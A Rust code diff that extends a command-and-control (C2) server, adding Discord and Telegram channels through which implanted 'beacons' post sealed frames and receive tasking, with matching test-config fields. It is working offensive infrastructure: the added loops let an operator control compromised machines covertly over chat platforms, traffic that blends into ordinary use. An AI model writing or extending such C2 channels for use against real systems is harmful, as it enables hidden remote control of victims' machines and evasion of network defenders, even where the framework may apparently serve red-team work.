@@ -73,6 +73,27 @@ pub async fn serve(state: ServerState, config: &crate::config::ServerConfig) -> 
         crate::grpc::serve(state.clone(), addr).await?;
         tracing::info!(grpc_bind, "c2 grpc listener up");
     }
+    // Spawn the chat-platform channels: the server half of the Discord and
+    // Telegram callback loops. Without these a beacon posts sealed frames into
+    // the channel and is never tasked.
+    for (label, endpoint) in [
+        ("discord", config.discord_channel.clone()),
+        ("telegram", config.telegram_channel.clone()),
+    ] {
+        let Some(endpoint) = endpoint else { continue };
+        let channel = crate::chat::channel_from_endpoint(&endpoint)
+            .map_err(|e| anyhow::anyhow!("invalid {label} channel endpoint: {e}"))?;
+        let channel_state = state.clone();
+        tracing::info!(channel = label, "c2 chat channel up");
+        tokio::spawn(async move {
+            crate::chat::serve(
+                channel,
+                crate::channel::frame_handler(channel_state.clone()),
+                std::time::Duration::from_secs(5),
+            )
+            .await;
+        });
+    }
     axum::serve(listener, app).await?;
     Ok(())
 }
@@ -156,6 +177,8 @@ mod tests {
             dns_bind: None,
             smb_bind: None,
             grpc_bind: None,
+            discord_channel: None,
+            telegram_channel: None,
             callback_host: "http://127.0.0.1:0".into(),
             psk: "test-psk".into(),
             downloads_dir: dir.path().join("downloads").display().to_string(),
